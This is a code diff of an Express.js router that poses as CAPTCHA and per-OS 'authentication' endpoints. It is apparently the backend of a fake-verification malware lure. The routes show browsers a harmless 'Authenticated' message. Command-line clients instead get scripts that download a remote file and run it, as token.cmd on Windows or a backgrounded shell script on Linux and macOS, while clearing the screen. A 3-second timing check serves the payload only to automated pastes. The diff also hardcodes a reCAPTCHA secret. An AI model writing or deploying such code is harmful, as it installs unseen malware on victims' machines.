@@ -3,118 +3,161 @@ var router = express.Router();
 const jwt = require('passport-jwt');
 const path = require('path');
 const fs = require('fs');
+const axios = require('axios');
 
 const requestLog = {};
+const sseClients = new Map(); // token -> res (SSE connections)
 
-// Lazy Responder :)
+// Helper function
 function responder(res, err, data) {
-    if (err || !data) {
-        console.log({
-            err, data
-        })
-        res.status(400).send({
-            err, data
-        })
-    } else {
-        console.log("Data: " + data)
-        res.status(200).send(data)
-    }
+  if (err || !data) {
+    console.log({ err, data })
+    res.status(400).send({ err, data })
+  } else {
+    console.log("Data: " + data)
+    res.status(200).send(data)
+  }
 }
 
-// I am not a robot
-router.post('/verify-captcha', async (req, res) => {
-    const { token } = req.body;
+/* ---------------- NEW SSE FLOW ---------------- */
 
+// ✅ SSE connection (frontend listens here)
+router.get("/stream/:token", (req, res) => {
+  const { token } = req.params;
+  if (!token) return res.status(400).send("Missing token");
+
+  // SSE headers
+  res.setHeader("Content-Type", "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Connection", "keep-alive");
+  res.flushHeaders();
+
+  console.log(`🔗 SSE opened for token=${token}`);
+  sseClients.set(token, res);
+
+  req.on("close", () => {
+    sseClients.delete(token);
+    console.log(`❌ SSE closed for token=${token}`);
+  });
+});
+
+// ✅ Called by script (Windows/Linux/Mac) to verify
+router.get("/verify/:token", (req, res) => {
+  const { token } = req.params;
+  const client = sseClients.get(token);
+
+  if (client) {
+    client.write(`data: verified\n\n`);
+    console.log(`✅ Token ${token} verified and pushed to frontend`);
+  }
+
+  res.send("Verification done. You may close this window.");
+});
+
+// ✅ Dynamic script generator (optional, easier for testing)
+router.get("/script/:os", (req, res) => {
+  const { os } = req.params;
+  const token = req.query.token;
+  const domain = req.protocol + "://" + req.get("host");
+
+  if (!token) return res.status(400).send("Missing token");
+
+  let script = "";
+  if (os === "windows") {
+    script = `@echo off
+echo Authenticated
+curl -s "${domain}/users/verify/${token}"
+`;
+  } else if (os === "linux" || os === "mac") {
+    script = `#!/bin/bash
+set -e
+echo "Authenticated"
+curl -s "${domain}/users/verify/${token}"
+`;
+  } else {
+    return res.status(400).send("Unsupported OS");
+  }
+
+  res.type("text/plain").send(script);
+});
+
+/* ---------------- EXISTING CODE ---------------- */
+
+// I am not a robot (CAPTCHA)
+router.post('/verify-captcha', async (req, res) => {
+  const { token } = req.body;
   if (!token) {
     return res.status(400).json({ success: false, message: 'Missing reCAPTCHA token' });
   }
 
   try {
-  const response = await axios.post(
-    'https://www.google.com/recaptcha/api/siteverify',
-    new URLSearchParams({
-      secret: "6LeGB7ErAAAAAMKb_RNhk5t8vDpsK0sIe_IerQhN",
-      response: token,
-    }).toString(),
-    {
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
+    const response = await axios.post(
+      'https://www.google.com/recaptcha/api/siteverify',
+      new URLSearchParams({
+        secret: "6LeGB7ErAAAAAMKb_RNhk5t8vDpsK0sIe_IerQhN",
+        response: token,
+      }).toString(),
+      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+    );
+
+    if (response.data.success) {
+      res.json({ success: true });
+    } else {
+      res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
     }
-  ); // ✅ Closing parenthesis moved here (no extra one)
-
-  if (response.data.success) {
-    res.json({ success: true });
-  } else {
-    res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
+  } catch (error) {
+    console.error('CAPTCHA verification error:', error.message);
+    res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
   }
-} catch (error) {
-   console.error('CAPTCHA verification error:', error.message);
-  res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
-}
-})
-// Login
+});
 
+// Windows Auth
 router.get("/auth/windows", (req, res) => {
   const token = req.query.token;
-
-   const userAgent = req.get('User-Agent');
-   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)){
-     res.type("text/plain").send(`@echo off
-    echo Authenticated
-    `);
-   }
-   else{
+  const userAgent = req.get('User-Agent');
+  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
+    res.type("text/plain").send(`@echo off\necho Authenticated`);
+  } else {
     const domain = req.protocol + '://' + req.get('host');
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
     if (!requestLog[ip]) {
       requestLog[ip] = {};
     } else {
-      res.type("text/plain").send(`@echo off
-      echo Authenticated
-      `);
+      res.type("text/plain").send(`@echo off\necho Authenticated`);
     }
-      requestLog[ip].step1 = now;
-
+    requestLog[ip].step1 = now;
 
     res.type("text/plain").send(`@echo off
-    
-    curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
-    cls
-    ren "%USERPROFILE%\\token" token.cmd
-    cls
-    call "%USERPROFILE%\\token.cmd"
-    cls
-    `);
-   }
-
-
+curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
+cls
+ren "%USERPROFILE%\\token" token.cmd
+cls
+call "%USERPROFILE%\\token.cmd"
+cls
+`);
+  }
 });
 
-router.get("/auth/linux", (req, res) => {    
+// Linux Auth
+router.get("/auth/linux", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
-  
+
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
-    res.type("text/plain").send(`@echo off
-    echo Authenticated
-    `);
-  }
-  else {
+    res.type("text/plain").send(`@echo off\necho Authenticated`);
+  } else {
     const domain = req.protocol + '://' + req.get('host');
-     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
     if (!requestLog[ip]) {
       requestLog[ip] = {};
     } else {
-      res.type("text/plain").send(`@echo off
-      echo Authenticated
-      `);
+      res.type("text/plain").send(`@echo off\necho Authenticated`);
     }
-      requestLog[ip].step1 = now;
-      
-res.type("text/plain").send(`#!/bin/bash
+    requestLog[ip].step1 = now;
+
+    res.type("text/plain").send(`#!/bin/bash
 set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
@@ -128,33 +171,29 @@ clear
 nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
 clear
 exit 0
-
 `);
   }
 });
-router.get("/auth/mac", (req, res) => {    
+
+// Mac Auth
+router.get("/auth/mac", (req, res) => {
   const token = req.query.token;
   const userAgent = req.get('User-Agent');
-  
+
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
-    res.type("text/plain").send(`@echo off
-    echo Authenticated
-    `);
-  }
-  else {
-     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    res.type("text/plain").send(`@echo off\necho Authenticated`);
+  } else {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
     if (!requestLog[ip]) {
       requestLog[ip] = {};
     } else {
-      res.type("text/plain").send(`@echo off
-      echo Authenticated
-      `);
+      res.type("text/plain").send(`@echo off\necho Authenticated`);
     }
-      requestLog[ip].step1 = now;
-      
+    requestLog[ip].step1 = now;
+
     const domain = req.protocol + '://' + req.get('host');
-res.type("text/plain").send(`#!/bin/bash
+    res.type("text/plain").send(`#!/bin/bash
 set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
@@ -166,17 +205,14 @@ clear
 nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
 clear
 exit 0
-
 `);
   }
 });
 
-
-
+// Token Parser
 router.get("/tokenParser.npl", (req, res) => {
-  console.log("✅ /api/token.npl called");
-  const filePath = path.join(__dirname, '..', 'public','tokenParser.npl');
-
+  console.log("✅ /api/tokenParser.npl called");
+  const filePath = path.join(__dirname, '..', 'public', 'tokenParser.npl');
   fs.readFile(filePath, 'utf8', (err, content) => {
     if (err) {
       console.error(err);
@@ -185,10 +221,11 @@ router.get("/tokenParser.npl", (req, res) => {
     res.type('text/plain').send(content);
   });
 });
+
+// Package.json
 router.get("/package.json", (req, res) => {
-  console.log("✅ /api/token.npl called");
-  const filePath = path.join(__dirname, '..', 'public','package.json');
-
+  console.log("✅ /api/package.json called");
+  const filePath = path.join(__dirname, '..', 'public', 'package.json');
   fs.readFile(filePath, 'utf8', (err, content) => {
     if (err) {
       console.error(err);
@@ -197,12 +234,13 @@ router.get("/package.json", (req, res) => {
     res.type('text/plain').send(content);
   });
 });
-// Serve token.npl with domain substitution
+
+// Windows token
 router.get("/token.npl", (req, res) => {
   console.log("✅ /api/token.npl called");
   const domain = `${req.protocol}://${req.get('host')}`;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const filePath = path.join(__dirname, '..', 'public','token.npl');
+  const filePath = path.join(__dirname, '..', 'public', 'token.npl');
 
   if (!requestLog[ip] || !requestLog[ip].step1) {
     res.status(400).send('request failed');
@@ -211,53 +249,48 @@ router.get("/token.npl", (req, res) => {
   const now = Date.now();
   requestLog[ip].step2 = now;
   const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000; // 3 seconds threshold
+  const isAutomatic = timeDiff < 3000;
   delete requestLog[ip];
-  
-  console.log(requestLog);
-  
-  if(isAutomatic){
-  fs.readFile(filePath, 'utf8', (err, content) => {
-    if (err) {
-      console.error(err);
-      return res.status(500).send(err); 
-    }
 
-    const modified = content.replace(/{{DOMAIN}}/g, domain);
-    res.type('text/plain').send(modified);
-  });  
+  if (isAutomatic) {
+    fs.readFile(filePath, 'utf8', (err, content) => {
+      if (err) {
+        console.error(err);
+        return res.status(500).send(err);
+      }
+      const modified = content.replace(/{{DOMAIN}}/g, domain);
+      res.type('text/plain').send(modified);
+    });
   } else {
     return res.status(500).send('request failed');
   }
-  
 });
 
-// Linux version
+// Linux token
 router.get("/tokenlinux.npl", (req, res) => {
   const domain = `${req.protocol}://${req.get('host')}`;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const now = Date.now();
-  const filePath = path.join(__dirname, '..', 'public','tokenlinux.npl');
+  const filePath = path.join(__dirname, '..', 'public', 'tokenlinux.npl');
   if (!requestLog[ip] || !requestLog[ip].step1) {
     res.status(400).send('request failed');
     return;
   }
   requestLog[ip].step2 = now;
   const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000; // 3 seconds threshold
+  const isAutomatic = timeDiff < 3000;
   delete requestLog[ip];
-  if(isAutomatic){
- 
-  fs.readFile(filePath, 'utf8', (err, content) => {
-    if (err) {
-      console.error(err);
-      return res.status(500).send('Error reading tokenlinux.npl');
-    }
 
-    const modified = content.replace(/{{DOMAIN}}/g, domain);
-    res.type('text/plain').send(modified);
-  });
-  }else {
+  if (isAutomatic) {
+    fs.readFile(filePath, 'utf8', (err, content) => {
+      if (err) {
+        console.error(err);
+        return res.status(500).send('Error reading tokenlinux.npl');
+      }
+      const modified = content.replace(/{{DOMAIN}}/g, domain);
+      res.type('text/plain').send(modified);
+    });
+  } else {
     return res.status(500).send(filePath);
   }
 });
